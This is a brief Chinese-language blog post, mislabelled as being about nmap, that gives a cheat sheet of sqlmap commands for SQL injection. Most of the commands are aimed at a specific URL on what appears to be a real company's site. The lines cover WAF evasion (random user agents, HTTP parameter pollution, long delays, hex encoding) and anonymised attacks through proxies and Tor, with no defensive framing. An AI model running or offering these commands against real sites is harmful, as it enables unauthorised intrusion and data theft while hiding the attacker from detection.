---
layout:	post
title:	KaliTools-nmap
date:   2018-04-10 13:00:12 +0800
categories: Kali
---

## SQLmap 常用语句

- 检测注入点：
`sqlmap -u "URL"`
- 检测注入点并自动进行选择：
`sqlmap -u "URL" --batch`

- [更新SQLmap](https://baijiahao.baidu.com/s?id=1561874838817969&wfr=spider&for=pc) 


## 使用参数进行绕过

` sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --random-agent -v 2 `
使用任意浏览器进行绕过，尤其是在WAF配置不当的时候

`sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --hpp -v 3`
使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上

`sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --delay=3.5 --time-sec=60`
使用长的延时来避免触发WAF的机制，这方式比较耗时

` sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --proxy=211.211.211.211:8080 --proxy-cred=211:985`
使用代理进行注入

` sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --ignore-proxy`
禁止使用系统的代理，直接连接进行注入

`sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --flush-session`
清空会话，重构注入

`sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --hex`
或者使用参数 --no-cast ，进行字符码转换

` sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4"  --mobile`
对移动端的服务器进行注入

`sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --tor `
匿名注入